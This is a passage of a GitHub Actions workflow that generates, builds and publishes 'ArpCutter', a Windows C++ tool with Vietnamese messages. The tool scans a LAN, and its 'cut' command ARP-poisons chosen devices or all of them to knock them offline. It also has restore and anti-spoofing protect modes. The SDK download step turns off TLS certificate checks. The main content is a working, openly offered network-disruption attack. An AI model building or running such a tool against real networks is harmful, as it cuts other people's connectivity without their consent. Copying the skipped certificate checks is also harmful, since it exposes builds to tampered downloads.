              int i = pickAdapterIndex(list, forced);
              if (i < 0) { logLine("ERR", "Khong tim thay card mang nao dang hoat dong."); return nullptr; }
              return &list[i];
          }

          static bool ensureGateway(pcap_t* h, const Adapter& a, Mac& gwMac, uint32_t& gwIp) {
              gwIp = defaultGateway(a.ip);
              if (!gwIp) gwIp = ipToU32("192.168.1.1");

              for (int i = 0; i < 3; i++)
                  if (arpResolve(h, a.mac, ipToU32(a.ip), gwIp, gwMac, 1500)) break;

              if (!gwMac.valid()) {
                  logLine("ERR", "Khong tim thay router " + u32ToIp(gwIp));
                  return false;
              }
              logLine("OK", "Router: " + u32ToIp(gwIp) + " -> " + gwMac.str());
              return true;
          }

          static int cmdStatus(std::vector<Adapter>& list) {
              printAdapters(list);
              Adapter* a = chooseAdapter(list, -1);
              if (!a) return 1;
              printf("Card dang dung  : %s  (%s)\n", a->ip.c_str(), a->mac.str().c_str());
              printf("Subnet          : %s\n", a->mask.c_str());
              printf("Router          : %s\n", u32ToIp(defaultGateway(a->ip)).c_str());

              Db db;
              db.load();
              printf("Thiet bi da biet: %d\n", (int)db.devices.size());
              printf("Lan quet cuoi   : %s\n", db.lastScan.empty()  ? "(chua)" : db.lastScan.c_str());
              printf("Lan check update: %s\n", db.lastCheck.empty() ? "(chua)" : db.lastCheck.c_str());
              printf("Thu muc du lieu : %s\n\n", dataDir().c_str());
              return 0;
          }

          static int cmdScan(Adapter& a, Db& db, bool quiet = false) {
              pcap_t* h = openAdapter(a);
              if (!h) return 1;

              Mac gwMac;
              uint32_t gwIp = 0;
              if (!ensureGateway(h, a, gwMac, gwIp)) { pcap_close(h); return 1; }

              std::vector<Device> found;
              logLine("NET", "Dang quet LAN ...");
              arpScan(h, a.mac, ipToU32(a.ip), ipToU32(a.mask), found, 6000, true);

              Device gw;
              gw.mac  = gwMac.str();
              gw.ip   = u32ToIp(gwIp);
              gw.name = "ROUTER";
              found.push_back(gw);

              int n = db.merge(found);
              db.lastScan = todayStr();
              db.save();

              if (!quiet) {
                  logLine("OK", "Quet xong: " + std::to_string(found.size()) +
                          " thiet bi, " + std::to_string(n) + " thiet bi MOI.");
                  printf("\n%-18s %-16s %-22s %s\n", "MAC (ID)", "IP", "TEN", "LAN CUOI");
                  for (auto& d : db.devices) {
                      printf("%-18s %-16s %-22s %s%s\n",
                             d.mac.c_str(), d.ip.c_str(),
                             d.name.empty() ? "-" : d.name.c_str(),
                             d.last.c_str(), d.isNew ? "   <== MOI" : "");
                  }
                  printf("\n");
              } else {
                  logLine("OK", "Quet tu dong: " + std::to_string(n) + " thiet bi moi.");
              }

              pcap_close(h);
              return 0;
          }

          static int cmdList(Db& db, bool onlyNew) {
              if (db.devices.empty()) { logLine("WARN", "Chua co du lieu. Chay: ArpCutter scan"); return 0; }
              printf("\n%-18s %-16s %-22s %-6s %s\n", "MAC (ID)", "IP", "TEN", "SEEN", "LAN CUOI");
              int c = 0;
              for (auto& d : db.devices) {
                  if (onlyNew && !d.isNew) continue;
                  printf("%-18s %-16s %-22s %-6d %s\n",
                         d.mac.c_str(), d.ip.c_str(),
                         d.name.empty() ? "-" : d.name.c_str(), d.seen, d.last.c_str());
                  c++;
              }
              printf("\nTong: %d\n\n", c);
              return 0;
          }
          '@ | Set-Content -Encoding utf8 src/main.cpp

      - name: Sinh main.cpp (phan 2)
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'

          @'
          static int cmdCut(Adapter& a, Db& db, const Opts& o) {
              pcap_t* h = openAdapter(a);
              if (!h) return 1;

              Mac gwMac;
              uint32_t gwIp = 0;
              if (!ensureGateway(h, a, gwMac, gwIp)) { pcap_close(h); return 1; }

              uint32_t myIp = ipToU32(a.ip);

              Spoofer sp;
              sp.h = h; sp.myMac = a.mac; sp.myIp = myIp;
              sp.gwMac = gwMac; sp.gwIp = gwIp;
              sp.bothWay = o.both;

              auto addTarget = [&](uint32_t ip, const Mac& mac) {
                  if (ip == myIp || ip == gwIp) return;
                  sp.add(ip, mac);
                  printf("  + cat: %-16s (%s)\n", u32ToIp(ip).c_str(), mac.str().c_str());
              };

              printf("\n--- Muc tieu ---\n");
              if (o.target == "all") {
                  for (auto& d : db.devices)
                      addTarget(ipToU32(d.ip), Mac::parse(d.mac));
              } else {
                  std::string t = o.target;
                  uint32_t ip = 0;
                  Mac m;

                  if (!t.empty() && t[0] == '#') {
                      Device* d = db.byIndex(atoi(t.c_str() + 1));
                      if (!d) { logLine("ERR", "Khong co muc tieu nay."); pcap_close(h); return 1; }
                      ip = ipToU32(d->ip);
                      m  = Mac::parse(d->mac);
                  } else if (t.find(':') != std::string::npos || t.size() == 12) {
                      m = Mac::parse(t);
                      Device* d = db.byMac(m.str());
                      if (d) ip = ipToU32(d->ip);
                      else {
                          logLine("NET", "Chua biet IP cua MAC nay, dang quet ...");
                          std::vector<Device> found;
                          arpScan(h, a.mac, myIp, ipToU32(a.mask), found, 5000, false);
                          for (auto& f : found) if (f.mac == m.str()) ip = ipToU32(f.ip);
                      }
                  } else {
                      ip = ipToU32(t);
                      Device* d = db.byIp(t);
                      if (d) m = Mac::parse(d->mac);
                      else if (!arpResolve(h, a.mac, myIp, ip, m)) {
                          logLine("ERR", "Khong tim thay " + t);
                          pcap_close(h);
                          return 1;
                      }
                  }
                  if (!ip || !m.valid()) {
                      logLine("ERR", "Khong xac dinh duoc muc tieu.");
                      pcap_close(h);
                      return 1;
                  }
                  addTarget(ip, m);
              }

              if (sp.t_.empty()) { logLine("WARN", "Khong co muc tieu nao."); pcap_close(h); return 0; }

              logLine("OK", "Bat dau ARP poison. Mang se bi cat.");
              sp.start();

              if (o.seconds > 0) {
                  for (int i = o.seconds; i > 0 && g_run; i--) {
                      printf("\r  con %3d giay ... (Ctrl+C de dung ngay)", i);
                      fflush(stdout);
                      Sleep(1000);
                  }
                  printf("\n");
                  sp.stop();
                  logLine("OK", "Da tra mang.");
              } else {
                  printf("\n  Nhan Enter de TRA MANG ...\n");
                  std::string dummy;
                  std::getline(std::cin, dummy);
                  sp.stop();
                  logLine("OK", "Da tra mang.");
              }

              pcap_close(h);
              return 0;
          }

          static int cmdRestore(Adapter& a, Db& db) {
              pcap_t* h = openAdapter(a);
              if (!h) return 1;

              Mac gwMac;
              uint32_t gwIp = 0;
              if (!ensureGateway(h, a, gwMac, gwIp)) { pcap_close(h); return 1; }

              Spoofer sp;
              sp.h = h; sp.myMac = a.mac; sp.myIp = ipToU32(a.ip);
              sp.gwMac = gwMac; sp.gwIp = gwIp;

              for (auto& d : db.devices) {
                  uint32_t ip = ipToU32(d.ip);
                  if (ip && ip != gwIp && ip != sp.myIp) sp.add(ip, Mac::parse(d.mac));
              }
              sp.restore();
              logLine("OK", "Da gui lai ARP dung cho " + std::to_string(sp.t_.size()) + " thiet bi.");
              pcap_close(h);
              return 0;
          }

          static int cmdProtect(Adapter& a, const Opts& o, bool watchOnly) {
              pcap_t* h = openAdapter(a);
              if (!h) return 1;

              Mac gwMac;
              uint32_t gwIp = 0;
              if (!ensureGateway(h, a, gwMac, gwIp)) { pcap_close(h); return 1; }

              if (!isAdmin())
                  logLine("WARN", "Khong phai Admin - ARP tinh se khong hoat dong.");

              if (watchOnly)
                  watchRun(h, a.mac, ipToU32(a.ip), gwMac, gwIp, g_run);
              else
                  protectRun(h, a.mac, ipToU32(a.ip), gwMac, gwIp, o.block, true, g_run);

              pcap_close(h);
              return 0;
          }

          static int cmdUpdate(Db& db, const Opts& o) {
              logLine("NET", "Dang kiem tra ban moi ...");
              Release r = fetchLatestRelease();

              db.lastCheck = todayStr();
              db.save();

              if (!r.ok) {
                  logLine("WARN", "Khong lay duoc release (kiem tra GH_OWNER/GH_REPO).");
                  return 1;
              }

              printf("  Ban hien tai : %s\n  Ban moi nhat : %s\n", APP_VERSION, r.version.c_str());

              if (cmpVersion(APP_VERSION, r.version) >= 0) {
                  logLine("OK", "Ban dang dung la moi nhat.");
                  return 0;
              }
              logLine("WARN", "Co ban moi: " + r.version);
              if (o.checkOnly) return 0;
              applyUpdate(r);
              return 0;
          }

          static void dailyAuto(Adapter& a, Db& db) {
              if (db.lastScan != todayStr()) {
                  logLine("NET", "Quet dinh ky hang ngay ...");
                  cmdScan(a, db, true);
              }
              if (db.lastCheck != todayStr()) {
                  Release r = fetchLatestRelease();
                  db.lastCheck = todayStr();
                  db.save();
                  if (r.ok && cmpVersion(APP_VERSION, r.version) < 0)
                      logLine("WARN", "Co ban moi " + r.version + " - dung lenh 'update' de cap nhat.");
              }
          }

          int main(int argc, char** argv) {
              SetConsoleOutputCP(65001);
              SetConsoleCtrlHandler(ctrlHandler, TRUE);

              WSADATA wsa{};
              WSAStartup(MAKEWORD(2, 2), &wsa);

              banner();
              if (!isAdmin())
                  logLine("WARN", "Hay chay bang quyen Administrator de ARP hoat dong dung.");

              Opts o = parseArgs(argc, argv);
              if (o.cmd == "help" || o.cmd == "-h" || o.cmd == "--help") { usage(); return 0; }

              auto list = listAdapters();
              Adapter* a = chooseAdapter(list, o.iface);
              if (!a) { printAdapters(list); return 1; }

              Db db;
              db.load();

              if (o.cmd.empty()) {
                  dailyAuto(*a, db);
                  printf("Card: %s (%s)   Router: %s   Thiet bi: %d\n\n",
                         a->ip.c_str(), a->mac.str().c_str(),
                         u32ToIp(defaultGateway(a->ip)).c_str(), (int)db.devices.size());
                  usage();
                  return 0;
              }

              if (o.cmd == "status")  return cmdStatus(list);
              if (o.cmd == "scan")    return cmdScan(*a, db);
              if (o.cmd == "list")    return cmdList(db, o.checkOnly);
              if (o.cmd == "update")  return cmdUpdate(db, o);
              if (o.cmd == "restore") return cmdRestore(*a, db);
              if (o.cmd == "protect") return cmdProtect(*a, o, false);
              if (o.cmd == "watch")   return cmdProtect(*a, o, true);
              if (o.cmd == "cut") {
                  if (o.target.empty()) { logLine("ERR", "Thieu muc tieu. Vi du: cut 192.168.1.15"); return 1; }
                  if (db.devices.empty()) cmdScan(*a, db, true);
                  return cmdCut(*a, db, o);
              }

              logLine("ERR", "Lenh khong hop le: " + o.cmd);
              usage();
              return 1;
          }
          '@ | Add-Content -Encoding utf8 src/main.cpp

      - name: Npcap SDK + Build
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $ProgressPreference    = 'SilentlyContinue'
          New-Item -ItemType Directory -Force -Path obj, dist | Out-Null

          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

          $url = "https://npcap.com/dist/npcap-sdk-1.13.zip"
          $zip = "npcap-sdk.zip"
          Remove-Item $zip -ErrorAction SilentlyContinue

          Write-Host "== Tai Npcap SDK =="
          $ok = $false
          for ($i = 1; $i -le 3 -and -not $ok; $i++) {
            try {
              Invoke-WebRequest -Uri $url -OutFile $zip -SkipCertificateCheck -MaximumRedirection 5
              $ok = (Test-Path $zip) -and ((Get-Item $zip).Length -gt 100000)
            } catch {
              Write-Host "  lan $i loi: $($_.Exception.Message)"
              Start-Sleep -Seconds 3
            }
          }
          if (-not $ok) {
            & curl.exe -L -k --retry 3 --retry-delay 2 -o $zip $url
            $ok = (Test-Path $zip) -and ((Get-Item $zip).Length -gt 100000)
          }
          if (-not $ok) { throw "Khong tai duoc Npcap SDK tu $url" }
          Write-Host ("  OK: " + (Get-Item $zip).Length + " bytes")

          Remove-Item npcap-sdk -Recurse -Force -ErrorAction SilentlyContinue
          Expand-Archive $zip -DestinationPath npcap-sdk -Force

          Write-Host "== Cay thu muc SDK =="
          Get-ChildItem npcap-sdk | Select-Object -ExpandProperty Name
          Get-ChildItem npcap-sdk\Include -ErrorAction SilentlyContinue |
            Select-Object -First 20 -ExpandProperty Name

          if (-not (Test-Path "npcap-sdk\Include\pcap.h"))    { throw "Thieu npcap-sdk\Include\pcap.h" }
          if (-not (Test-Path "npcap-sdk\Lib\x64\wpcap.lib")) { throw "Thieu npcap-sdk\Lib\x64\wpcap.lib" }

          $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
          $vsPath  = & $vswhere -latest -products * `
                       -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 `
                       -property installationPath
          if (-not $vsPath) { throw "Khong tim thay Visual Studio" }
          $vcvars = Join-Path $vsPath 'VC\Auxiliary\Build\vcvars64.bat'

          $srcs = (Get-ChildItem src\*.cpp | ForEach-Object { $_.FullName }) -join ' '
          $inc  = (Resolve-Path "npcap-sdk\Include").Path
          $lib  = (Resolve-Path "npcap-sdk\Lib\x64").Path

          Write-Host "INCLUDE = $inc"
          Write-Host "LIB     = $lib"
          Write-Host "SRCS    = $srcs"

          $cmdline = 'cl /nologo /std:c++17 /EHsc /O2 /MT /W3 /utf-8 /D_CRT_SECURE_NO_WARNINGS /I "' +
                     $inc + '" ' + $srcs + ' /Fo:obj\ /Fe:dist\ArpCutter.exe /link /LIBPATH:"' +
                     $lib + '" wpcap.lib Packet.lib ws2_32.lib iphlpapi.lib winhttp.lib'

          $bat = "@echo off`r`ncall `"$vcvars`" >nul`r`n$cmdline`r`n"
          Set-Content -Encoding ascii build.bat $bat

          Write-Host "== build.bat =="
          Get-Content build.bat

          Write-Host "== Build =="
          & cmd.exe /c build.bat
          if ($LASTEXITCODE -ne 0) { throw "Build that bai" }

          $h = (Get-FileHash dist/ArpCutter.exe -Algorithm SHA256).Hash.ToLower()
          "SHA256(ArpCutter.exe) = $h" | Set-Content -Encoding utf8 dist/checksums.txt
          Get-ChildItem dist

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: ArpCutter-${{ steps.build.outputs.VER }}
          path: |
            dist/ArpCutter.exe
            dist/checksums.txt
          if-no-files-found: error

      - name: Publish Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: v${{ steps.build.outputs.VER }}
          name: "ArpCutter v${{ steps.build.outputs.VER }} - ${{ steps.build.outputs.DATE }}"
          make_latest: true
          files: |
            dist/ArpCutter.exe
            dist/checksums.txt
          body: |
            **ArpCutter v${{ steps.build.outputs.VER }}** - build tu dong ngay ${{ steps.build.outputs.DATE }}

            Cat mang ARP cho LAN nha (VNPT).

            - `scan` quet LAN, luu thiet bi theo MAC (MAC = ID), tu quet lai hang ngay
            - `cut <ip|mac|#so|all>` cat / tra mang
            - `protect --block` tu bao ve may ban + router khoi ARP spoof & ARP flood
            - `update` tu tai ban moi

            Can cai **Npcap** (npcap.com) va chay bang **Administrator**.
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
